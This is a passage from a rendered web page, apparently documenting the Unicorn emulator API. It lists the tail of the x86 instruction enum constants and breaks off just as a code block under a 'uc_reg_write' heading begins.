UC_X86_INS_VPBLENDVB,<br><span class="hljs-number">1004</span>    UC_X86_INS_VPBLENDW,<br><span class="hljs-number">1005</span>    UC_X86_INS_VPBROADCASTB,<br><span class="hljs-number">1006</span>    UC_X86_INS_VPBROADCASTD,<br><span class="hljs-number">1007</span>    UC_X86_INS_VPBROADCASTMB2Q,<br><span class="hljs-number">1008</span>    UC_X86_INS_VPBROADCASTMW2D,<br><span class="hljs-number">1009</span>    UC_X86_INS_VPBROADCASTQ,<br><span class="hljs-number">1010</span>    UC_X86_INS_VPBROADCASTW,<br><span class="hljs-number">1011</span>    UC_X86_INS_VPCLMULQDQ,<br><span class="hljs-number">1012</span>    UC_X86_INS_VPCMOV,<br><span class="hljs-number">1013</span>    UC_X86_INS_VPCMPB,<br><span class="hljs-number">1014</span>    UC_X86_INS_VPCMPD,<br><span class="hljs-number">1015</span>    UC_X86_INS_VPCMPEQB,<br><span class="hljs-number">1016</span>    UC_X86_INS_VPCMPEQD,<br><span class="hljs-number">1017</span>    UC_X86_INS_VPCMPEQQ,<br><span class="hljs-number">1018</span>    UC_X86_INS_VPCMPEQW,<br><span class="hljs-number">1019</span>    UC_X86_INS_VPCMPESTRI,<br><span class="hljs-number">1020</span>    UC_X86_INS_VPCMPESTRM,<br><span class="hljs-number">1021</span>    UC_X86_INS_VPCMPGTB,<br><span class="hljs-number">1022</span>    UC_X86_INS_VPCMPGTD,<br><span class="hljs-number">1023</span>    UC_X86_INS_VPCMPGTQ,<br><span class="hljs-number">1024</span>    UC_X86_INS_VPCMPGTW,<br><span class="hljs-number">1025</span>    UC_X86_INS_VPCMPISTRI,<br><span class="hljs-number">1026</span>    UC_X86_INS_VPCMPISTRM,<br><span class="hljs-number">1027</span>    UC_X86_INS_VPCMPQ,<br><span class="hljs-number">1028</span>    UC_X86_INS_VPCMPUB,<br><span class="hljs-number">1029</span>    UC_X86_INS_VPCMPUD,<br><span class="hljs-number">1030</span>    UC_X86_INS_VPCMPUQ,<br><span class="hljs-number">1031</span>    UC_X86_INS_VPCMPUW,<br><span class="hljs-number">1032</span>    UC_X86_INS_VPCMPW,<br><span class="hljs-number">1033</span>    UC_X86_INS_VPCOMB,<br><span class="hljs-number">1034</span>    UC_X86_INS_VPCOMD,<br><span class="hljs-number">1035</span>    UC_X86_INS_VPCOMPRESSD,<br><span class="hljs-number">1036</span>    UC_X86_INS_VPCOMPRESSQ,<br><span class="hljs-number">1037</span>    UC_X86_INS_VPCOMQ,<br><span class="hljs-number">1038</span>    UC_X86_INS_VPCOMUB,<br><span class="hljs-number">1039</span>    UC_X86_INS_VPCOMUD,<br><span class="hljs-number">1040</span>    UC_X86_INS_VPCOMUQ,<br><span class="hljs-number">1041</span>    UC_X86_INS_VPCOMUW,<br><span class="hljs-number">1042</span>    UC_X86_INS_VPCOMW,<br><span class="hljs-number">1043</span>    UC_X86_INS_VPCONFLICTD,<br><span class="hljs-number">1044</span>    UC_X86_INS_VPCONFLICTQ,<br><span class="hljs-number">1045</span>    UC_X86_INS_VPERM2F128,<br><span class="hljs-number">1046</span>    UC_X86_INS_VPERM2I128,<br><span class="hljs-number">1047</span>    UC_X86_INS_VPERMD,<br><span class="hljs-number">1048</span>    UC_X86_INS_VPERMI2D,<br><span class="hljs-number">1049</span>    UC_X86_INS_VPERMI2PD,<br><span class="hljs-number">1050</span>    UC_X86_INS_VPERMI2PS,<br><span class="hljs-number">1051</span>    UC_X86_INS_VPERMI2Q,<br><span class="hljs-number">1052</span>    UC_X86_INS_VPERMIL2PD,<br><span class="hljs-number">1053</span>    UC_X86_INS_VPERMIL2PS,<br><span class="hljs-number">1054</span>    UC_X86_INS_VPERMILPD,<br><span class="hljs-number">1055</span>    UC_X86_INS_VPERMILPS,<br><span class="hljs-number">1056</span>    UC_X86_INS_VPERMPD,<br><span class="hljs-number">1057</span>    UC_X86_INS_VPERMPS,<br><span class="hljs-number">1058</span>    UC_X86_INS_VPERMQ,<br><span class="hljs-number">1059</span>    UC_X86_INS_VPERMT2D,<br><span class="hljs-number">1060</span>    UC_X86_INS_VPERMT2PD,<br><span class="hljs-number">1061</span>    UC_X86_INS_VPERMT2PS,<br><span class="hljs-number">1062</span>    UC_X86_INS_VPERMT2Q,<br><span class="hljs-number">1063</span>    UC_X86_INS_VPEXPANDD,<br><span class="hljs-number">1064</span>    UC_X86_INS_VPEXPANDQ,<br><span class="hljs-number">1065</span>    UC_X86_INS_VPEXTRB,<br><span class="hljs-number">1066</span>    UC_X86_INS_VPEXTRD,<br><span class="hljs-number">1067</span>    UC_X86_INS_VPEXTRQ,<br><span class="hljs-number">1068</span>    UC_X86_INS_VPEXTRW,<br><span class="hljs-number">1069</span>    UC_X86_INS_VPGATHERDD,<br><span class="hljs-number">1070</span>    UC_X86_INS_VPGATHERDQ,<br><span class="hljs-number">1071</span>    UC_X86_INS_VPGATHERQD,<br><span class="hljs-number">1072</span>    UC_X86_INS_VPGATHERQQ,<br><span class="hljs-number">1073</span>    UC_X86_INS_VPHADDBD,<br><span class="hljs-number">1074</span>    UC_X86_INS_VPHADDBQ,<br><span class="hljs-number">1075</span>    UC_X86_INS_VPHADDBW,<br><span class="hljs-number">1076</span>    UC_X86_INS_VPHADDDQ,<br><span class="hljs-number">1077</span>    UC_X86_INS_VPHADDD,<br><span class="hljs-number">1078</span>    UC_X86_INS_VPHADDSW,<br><span class="hljs-number">1079</span>    UC_X86_INS_VPHADDUBD,<br><span class="hljs-number">1080</span>    UC_X86_INS_VPHADDUBQ,<br><span class="hljs-number">1081</span>    UC_X86_INS_VPHADDUBW,<br><span class="hljs-number">1082</span>    UC_X86_INS_VPHADDUDQ,<br><span class="hljs-number">1083</span>    UC_X86_INS_VPHADDUWD,<br><span class="hljs-number">1084</span>    UC_X86_INS_VPHADDUWQ,<br><span class="hljs-number">1085</span>    UC_X86_INS_VPHADDWD,<br><span class="hljs-number">1086</span>    UC_X86_INS_VPHADDWQ,<br><span class="hljs-number">1087</span>    UC_X86_INS_VPHADDW,<br><span class="hljs-number">1088</span>    UC_X86_INS_VPHMINPOSUW,<br><span class="hljs-number">1089</span>    UC_X86_INS_VPHSUBBW,<br><span class="hljs-number">1090</span>    UC_X86_INS_VPHSUBDQ,<br><span class="hljs-number">1091</span>    UC_X86_INS_VPHSUBD,<br><span class="hljs-number">1092</span>    UC_X86_INS_VPHSUBSW,<br><span class="hljs-number">1093</span>    UC_X86_INS_VPHSUBWD,<br><span class="hljs-number">1094</span>    UC_X86_INS_VPHSUBW,<br><span class="hljs-number">1095</span>    UC_X86_INS_VPINSRB,<br><span class="hljs-number">1096</span>    UC_X86_INS_VPINSRD,<br><span class="hljs-number">1097</span>    UC_X86_INS_VPINSRQ,<br><span class="hljs-number">1098</span>    UC_X86_INS_VPINSRW,<br><span class="hljs-number">1099</span>    UC_X86_INS_VPLZCNTD,<br><span class="hljs-number">1100</span>    UC_X86_INS_VPLZCNTQ,<br><span class="hljs-number">1101</span>    UC_X86_INS_VPMACSDD,<br><span class="hljs-number">1102</span>    UC_X86_INS_VPMACSDQH,<br><span class="hljs-number">1103</span>    UC_X86_INS_VPMACSDQL,<br><span class="hljs-number">1104</span>    UC_X86_INS_VPMACSSDD,<br><span class="hljs-number">1105</span>    UC_X86_INS_VPMACSSDQH,<br><span class="hljs-number">1106</span>    UC_X86_INS_VPMACSSDQL,<br><span class="hljs-number">1107</span>    UC_X86_INS_VPMACSSWD,<br><span class="hljs-number">1108</span>    UC_X86_INS_VPMACSSWW,<br><span class="hljs-number">1109</span>    UC_X86_INS_VPMACSWD,<br><span class="hljs-number">1110</span>    UC_X86_INS_VPMACSWW,<br><span class="hljs-number">1111</span>    UC_X86_INS_VPMADCSSWD,<br><span class="hljs-number">1112</span>    UC_X86_INS_VPMADCSWD,<br><span class="hljs-number">1113</span>    UC_X86_INS_VPMADDUBSW,<br><span class="hljs-number">1114</span>    UC_X86_INS_VPMADDWD,<br><span class="hljs-number">1115</span>    UC_X86_INS_VPMASKMOVD,<br><span class="hljs-number">1116</span>    UC_X86_INS_VPMASKMOVQ,<br><span class="hljs-number">1117</span>    UC_X86_INS_VPMAXSB,<br><span class="hljs-number">1118</span>    UC_X86_INS_VPMAXSD,<br><span class="hljs-number">1119</span>    UC_X86_INS_VPMAXSQ,<br><span class="hljs-number">1120</span>    UC_X86_INS_VPMAXSW,<br><span class="hljs-number">1121</span>    UC_X86_INS_VPMAXUB,<br><span class="hljs-number">1122</span>    UC_X86_INS_VPMAXUD,<br><span class="hljs-number">1123</span>    UC_X86_INS_VPMAXUQ,<br><span class="hljs-number">1124</span>    UC_X86_INS_VPMAXUW,<br><span class="hljs-number">1125</span>    UC_X86_INS_VPMINSB,<br><span class="hljs-number">1126</span>    UC_X86_INS_VPMINSD,<br><span class="hljs-number">1127</span>    UC_X86_INS_VPMINSQ,<br><span class="hljs-number">1128</span>    UC_X86_INS_VPMINSW,<br><span class="hljs-number">1129</span>    UC_X86_INS_VPMINUB,<br><span class="hljs-number">1130</span>    UC_X86_INS_VPMINUD,<br><span class="hljs-number">1131</span>    UC_X86_INS_VPMINUQ,<br><span class="hljs-number">1132</span>    UC_X86_INS_VPMINUW,<br><span class="hljs-number">1133</span>    UC_X86_INS_VPMOVDB,<br><span class="hljs-number">1134</span>    UC_X86_INS_VPMOVDW,<br><span class="hljs-number">1135</span>    UC_X86_INS_VPMOVM2B,<br><span class="hljs-number">1136</span>    UC_X86_INS_VPMOVM2D,<br><span class="hljs-number">1137</span>    UC_X86_INS_VPMOVM2Q,<br><span class="hljs-number">1138</span>    UC_X86_INS_VPMOVM2W,<br><span class="hljs-number">1139</span>    UC_X86_INS_VPMOVMSKB,<br><span class="hljs-number">1140</span>    UC_X86_INS_VPMOVQB,<br><span class="hljs-number">1141</span>    UC_X86_INS_VPMOVQD,<br><span class="hljs-number">1142</span>    UC_X86_INS_VPMOVQW,<br><span class="hljs-number">1143</span>    UC_X86_INS_VPMOVSDB,<br><span class="hljs-number">1144</span>    UC_X86_INS_VPMOVSDW,<br><span class="hljs-number">1145</span>    UC_X86_INS_VPMOVSQB,<br><span class="hljs-number">1146</span>    UC_X86_INS_VPMOVSQD,<br><span class="hljs-number">1147</span>    UC_X86_INS_VPMOVSQW,<br><span class="hljs-number">1148</span>    UC_X86_INS_VPMOVSXBD,<br><span class="hljs-number">1149</span>    UC_X86_INS_VPMOVSXBQ,<br><span class="hljs-number">1150</span>    UC_X86_INS_VPMOVSXBW,<br><span class="hljs-number">1151</span>    UC_X86_INS_VPMOVSXDQ,<br><span class="hljs-number">1152</span>    UC_X86_INS_VPMOVSXWD,<br><span class="hljs-number">1153</span>    UC_X86_INS_VPMOVSXWQ,<br><span class="hljs-number">1154</span>    UC_X86_INS_VPMOVUSDB,<br><span class="hljs-number">1155</span>    UC_X86_INS_VPMOVUSDW,<br><span class="hljs-number">1156</span>    UC_X86_INS_VPMOVUSQB,<br><span class="hljs-number">1157</span>    UC_X86_INS_VPMOVUSQD,<br><span class="hljs-number">1158</span>    UC_X86_INS_VPMOVUSQW,<br><span class="hljs-number">1159</span>    UC_X86_INS_VPMOVZXBD,<br><span class="hljs-number">1160</span>    UC_X86_INS_VPMOVZXBQ,<br><span class="hljs-number">1161</span>    UC_X86_INS_VPMOVZXBW,<br><span class="hljs-number">1162</span>    UC_X86_INS_VPMOVZXDQ,<br><span class="hljs-number">1163</span>    UC_X86_INS_VPMOVZXWD,<br><span class="hljs-number">1164</span>    UC_X86_INS_VPMOVZXWQ,<br><span class="hljs-number">1165</span>    UC_X86_INS_VPMULDQ,<br><span class="hljs-number">1166</span>    UC_X86_INS_VPMULHRSW,<br><span class="hljs-number">1167</span>    UC_X86_INS_VPMULHUW,<br><span class="hljs-number">1168</span>    UC_X86_INS_VPMULHW,<br><span class="hljs-number">1169</span>    UC_X86_INS_VPMULLD,<br><span class="hljs-number">1170</span>    UC_X86_INS_VPMULLQ,<br><span class="hljs-number">1171</span>    UC_X86_INS_VPMULLW,<br><span class="hljs-number">1172</span>    UC_X86_INS_VPMULUDQ,<br><span class="hljs-number">1173</span>    UC_X86_INS_VPORD,<br><span class="hljs-number">1174</span>    UC_X86_INS_VPORQ,<br><span class="hljs-number">1175</span>    UC_X86_INS_VPOR,<br><span class="hljs-number">1176</span>    UC_X86_INS_VPPERM,<br><span class="hljs-number">1177</span>    UC_X86_INS_VPROTB,<br><span class="hljs-number">1178</span>    UC_X86_INS_VPROTD,<br><span class="hljs-number">1179</span>    UC_X86_INS_VPROTQ,<br><span class="hljs-number">1180</span>    UC_X86_INS_VPROTW,<br><span class="hljs-number">1181</span>    UC_X86_INS_VPSADBW,<br><span class="hljs-number">1182</span>    UC_X86_INS_VPSCATTERDD,<br><span class="hljs-number">1183</span>    UC_X86_INS_VPSCATTERDQ,<br><span class="hljs-number">1184</span>    UC_X86_INS_VPSCATTERQD,<br><span class="hljs-number">1185</span>    UC_X86_INS_VPSCATTERQQ,<br><span class="hljs-number">1186</span>    UC_X86_INS_VPSHAB,<br><span class="hljs-number">1187</span>    UC_X86_INS_VPSHAD,<br><span class="hljs-number">1188</span>    UC_X86_INS_VPSHAQ,<br><span class="hljs-number">1189</span>    UC_X86_INS_VPSHAW,<br><span class="hljs-number">1190</span>    UC_X86_INS_VPSHLB,<br><span class="hljs-number">1191</span>    UC_X86_INS_VPSHLD,<br><span class="hljs-number">1192</span>    UC_X86_INS_VPSHLQ,<br><span class="hljs-number">1193</span>    UC_X86_INS_VPSHLW,<br><span class="hljs-number">1194</span>    UC_X86_INS_VPSHUFB,<br><span class="hljs-number">1195</span>    UC_X86_INS_VPSHUFD,<br><span class="hljs-number">1196</span>    UC_X86_INS_VPSHUFHW,<br><span class="hljs-number">1197</span>    UC_X86_INS_VPSHUFLW,<br><span class="hljs-number">1198</span>    UC_X86_INS_VPSIGNB,<br><span class="hljs-number">1199</span>    UC_X86_INS_VPSIGND,<br><span class="hljs-number">1200</span>    UC_X86_INS_VPSIGNW,<br><span class="hljs-number">1201</span>    UC_X86_INS_VPSLLDQ,<br><span class="hljs-number">1202</span>    UC_X86_INS_VPSLLD,<br><span class="hljs-number">1203</span>    UC_X86_INS_VPSLLQ,<br><span class="hljs-number">1204</span>    UC_X86_INS_VPSLLVD,<br><span class="hljs-number">1205</span>    UC_X86_INS_VPSLLVQ,<br><span class="hljs-number">1206</span>    UC_X86_INS_VPSLLW,<br><span class="hljs-number">1207</span>    UC_X86_INS_VPSRAD,<br><span class="hljs-number">1208</span>    UC_X86_INS_VPSRAQ,<br><span class="hljs-number">1209</span>    UC_X86_INS_VPSRAVD,<br><span class="hljs-number">1210</span>    UC_X86_INS_VPSRAVQ,<br><span class="hljs-number">1211</span>    UC_X86_INS_VPSRAW,<br><span class="hljs-number">1212</span>    UC_X86_INS_VPSRLDQ,<br><span class="hljs-number">1213</span>    UC_X86_INS_VPSRLD,<br><span class="hljs-number">1214</span>    UC_X86_INS_VPSRLQ,<br><span class="hljs-number">1215</span>    UC_X86_INS_VPSRLVD,<br><span class="hljs-number">1216</span>    UC_X86_INS_VPSRLVQ,<br><span class="hljs-number">1217</span>    UC_X86_INS_VPSRLW,<br><span class="hljs-number">1218</span>    UC_X86_INS_VPSUBB,<br><span class="hljs-number">1219</span>    UC_X86_INS_VPSUBD,<br><span class="hljs-number">1220</span>    UC_X86_INS_VPSUBQ,<br><span class="hljs-number">1221</span>    UC_X86_INS_VPSUBSB,<br><span class="hljs-number">1222</span>    UC_X86_INS_VPSUBSW,<br><span class="hljs-number">1223</span>    UC_X86_INS_VPSUBUSB,<br><span class="hljs-number">1224</span>    UC_X86_INS_VPSUBUSW,<br><span class="hljs-number">1225</span>    UC_X86_INS_VPSUBW,<br><span class="hljs-number">1226</span>    UC_X86_INS_VPTESTMD,<br><span class="hljs-number">1227</span>    UC_X86_INS_VPTESTMQ,<br><span class="hljs-number">1228</span>    UC_X86_INS_VPTESTNMD,<br><span class="hljs-number">1229</span>    UC_X86_INS_VPTESTNMQ,<br><span class="hljs-number">1230</span>    UC_X86_INS_VPTEST,<br><span class="hljs-number">1231</span>    UC_X86_INS_VPUNPCKHBW,<br><span class="hljs-number">1232</span>    UC_X86_INS_VPUNPCKHDQ,<br><span class="hljs-number">1233</span>    UC_X86_INS_VPUNPCKHQDQ,<br><span class="hljs-number">1234</span>    UC_X86_INS_VPUNPCKHWD,<br><span class="hljs-number">1235</span>    UC_X86_INS_VPUNPCKLBW,<br><span class="hljs-number">1236</span>    UC_X86_INS_VPUNPCKLDQ,<br><span class="hljs-number">1237</span>    UC_X86_INS_VPUNPCKLQDQ,<br><span class="hljs-number">1238</span>    UC_X86_INS_VPUNPCKLWD,<br><span class="hljs-number">1239</span>    UC_X86_INS_VPXORD,<br><span class="hljs-number">1240</span>    UC_X86_INS_VPXORQ,<br><span class="hljs-number">1241</span>    UC_X86_INS_VPXOR,<br><span class="hljs-number">1242</span>    UC_X86_INS_VRCP14PD,<br><span class="hljs-number">1243</span>    UC_X86_INS_VRCP14PS,<br><span class="hljs-number">1244</span>    UC_X86_INS_VRCP14SD,<br><span class="hljs-number">1245</span>    UC_X86_INS_VRCP14SS,<br><span class="hljs-number">1246</span>    UC_X86_INS_VRCP28PD,<br><span class="hljs-number">1247</span>    UC_X86_INS_VRCP28PS,<br><span class="hljs-number">1248</span>    UC_X86_INS_VRCP28SD,<br><span class="hljs-number">1249</span>    UC_X86_INS_VRCP28SS,<br><span class="hljs-number">1250</span>    UC_X86_INS_VRCPPS,<br><span class="hljs-number">1251</span>    UC_X86_INS_VRCPSS,<br><span class="hljs-number">1252</span>    UC_X86_INS_VRNDSCALEPD,<br><span class="hljs-number">1253</span>    UC_X86_INS_VRNDSCALEPS,<br><span class="hljs-number">1254</span>    UC_X86_INS_VRNDSCALESD,<br><span class="hljs-number">1255</span>    UC_X86_INS_VRNDSCALESS,<br><span class="hljs-number">1256</span>    UC_X86_INS_VROUNDPD,<br><span class="hljs-number">1257</span>    UC_X86_INS_VROUNDPS,<br><span class="hljs-number">1258</span>    UC_X86_INS_VROUNDSD,<br><span class="hljs-number">1259</span>    UC_X86_INS_VROUNDSS,<br><span class="hljs-number">1260</span>    UC_X86_INS_VRSQRT14PD,<br><span class="hljs-number">1261</span>    UC_X86_INS_VRSQRT14PS,<br><span class="hljs-number">1262</span>    UC_X86_INS_VRSQRT14SD,<br><span class="hljs-number">1263</span>    UC_X86_INS_VRSQRT14SS,<br><span class="hljs-number">1264</span>    UC_X86_INS_VRSQRT28PD,<br><span class="hljs-number">1265</span>    UC_X86_INS_VRSQRT28PS,<br><span class="hljs-number">1266</span>    UC_X86_INS_VRSQRT28SD,<br><span class="hljs-number">1267</span>    UC_X86_INS_VRSQRT28SS,<br><span class="hljs-number">1268</span>    UC_X86_INS_VRSQRTPS,<br><span class="hljs-number">1269</span>    UC_X86_INS_VRSQRTSS,<br><span class="hljs-number">1270</span>    UC_X86_INS_VSCATTERDPD,<br><span class="hljs-number">1271</span>    UC_X86_INS_VSCATTERDPS,<br><span class="hljs-number">1272</span>    UC_X86_INS_VSCATTERPF0DPD,<br><span class="hljs-number">1273</span>    UC_X86_INS_VSCATTERPF0DPS,<br><span class="hljs-number">1274</span>    UC_X86_INS_VSCATTERPF0QPD,<br><span class="hljs-number">1275</span>    UC_X86_INS_VSCATTERPF0QPS,<br><span class="hljs-number">1276</span>    UC_X86_INS_VSCATTERPF1DPD,<br><span class="hljs-number">1277</span>    UC_X86_INS_VSCATTERPF1DPS,<br><span class="hljs-number">1278</span>    UC_X86_INS_VSCATTERPF1QPD,<br><span class="hljs-number">1279</span>    UC_X86_INS_VSCATTERPF1QPS,<br><span class="hljs-number">1280</span>    UC_X86_INS_VSCATTERQPD,<br><span class="hljs-number">1281</span>    UC_X86_INS_VSCATTERQPS,<br><span class="hljs-number">1282</span>    UC_X86_INS_VSHUFPD,<br><span class="hljs-number">1283</span>    UC_X86_INS_VSHUFPS,<br><span class="hljs-number">1284</span>    UC_X86_INS_VSQRTPD,<br><span class="hljs-number">1285</span>    UC_X86_INS_VSQRTPS,<br><span class="hljs-number">1286</span>    UC_X86_INS_VSQRTSD,<br><span class="hljs-number">1287</span>    UC_X86_INS_VSQRTSS,<br><span class="hljs-number">1288</span>    UC_X86_INS_VSTMXCSR,<br><span class="hljs-number">1289</span>    UC_X86_INS_VSUBPD,<br><span class="hljs-number">1290</span>    UC_X86_INS_VSUBPS,<br><span class="hljs-number">1291</span>    UC_X86_INS_VSUBSD,<br><span class="hljs-number">1292</span>    UC_X86_INS_VSUBSS,<br><span class="hljs-number">1293</span>    UC_X86_INS_VTESTPD,<br><span class="hljs-number">1294</span>    UC_X86_INS_VTESTPS,<br><span class="hljs-number">1295</span>    UC_X86_INS_VUNPCKHPD,<br><span class="hljs-number">1296</span>    UC_X86_INS_VUNPCKHPS,<br><span class="hljs-number">1297</span>    UC_X86_INS_VUNPCKLPD,<br><span class="hljs-number">1298</span>    UC_X86_INS_VUNPCKLPS,<br><span class="hljs-number">1299</span>    UC_X86_INS_VZEROALL,<br><span class="hljs-number">1300</span>    UC_X86_INS_VZEROUPPER,<br><span class="hljs-number">1301</span>    UC_X86_INS_WAIT,<br><span class="hljs-number">1302</span>    UC_X86_INS_WBINVD,<br><span class="hljs-number">1303</span>    UC_X86_INS_WRFSBASE,<br><span class="hljs-number">1304</span>    UC_X86_INS_WRGSBASE,<br><span class="hljs-number">1305</span>    UC_X86_INS_WRMSR,<br><span class="hljs-number">1306</span>    UC_X86_INS_XABORT,<br><span class="hljs-number">1307</span>    UC_X86_INS_XACQUIRE,<br><span class="hljs-number">1308</span>    UC_X86_INS_XBEGIN,<br><span class="hljs-number">1309</span>    UC_X86_INS_XCHG,<br><span class="hljs-number">1310</span>    UC_X86_INS_XCRYPTCBC,<br><span class="hljs-number">1311</span>    UC_X86_INS_XCRYPTCFB,<br><span class="hljs-number">1312</span>    UC_X86_INS_XCRYPTCTR,<br><span class="hljs-number">1313</span>    UC_X86_INS_XCRYPTECB,<br><span class="hljs-number">1314</span>    UC_X86_INS_XCRYPTOFB,<br><span class="hljs-number">1315</span>    UC_X86_INS_XEND,<br><span class="hljs-number">1316</span>    UC_X86_INS_XGETBV,<br><span class="hljs-number">1317</span>    UC_X86_INS_XLATB,<br><span class="hljs-number">1318</span>    UC_X86_INS_XRELEASE,<br><span class="hljs-number">1319</span>    UC_X86_INS_XRSTOR,<br><span class="hljs-number">1320</span>    UC_X86_INS_XRSTOR64,<br><span class="hljs-number">1321</span>    UC_X86_INS_XRSTORS,<br><span class="hljs-number">1322</span>    UC_X86_INS_XRSTORS64,<br><span class="hljs-number">1323</span>    UC_X86_INS_XSAVE,<br><span class="hljs-number">1324</span>    UC_X86_INS_XSAVE64,<br><span class="hljs-number">1325</span>    UC_X86_INS_XSAVEC,<br><span class="hljs-number">1326</span>    UC_X86_INS_XSAVEC64,<br><span class="hljs-number">1327</span>    UC_X86_INS_XSAVEOPT,<br><span class="hljs-number">1328</span>    UC_X86_INS_XSAVEOPT64,<br><span class="hljs-number">1329</span>    UC_X86_INS_XSAVES,<br><span class="hljs-number">1330</span>    UC_X86_INS_XSAVES64,<br><span class="hljs-number">1331</span>    UC_X86_INS_XSETBV,<br><span class="hljs-number">1332</span>    UC_X86_INS_XSHA1,<br><span class="hljs-number">1333</span>    UC_X86_INS_XSHA256,<br><span class="hljs-number">1334</span>    UC_X86_INS_XSTORE,<br><span class="hljs-number">1335</span>    UC_X86_INS_XTEST,<br><span class="hljs-number">1336</span>    UC_X86_INS_FDISI8087_NOP,<br><span class="hljs-number">1337</span>    UC_X86_INS_FENI8087_NOP,<br><span class="hljs-number">1338</span>    UC_X86_INS_ENDING,<br>&#125; uc_x86_insn;<br></code></pre></td></tr></table></figure><p><strong>uc_reg_write</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function">uc_err <span 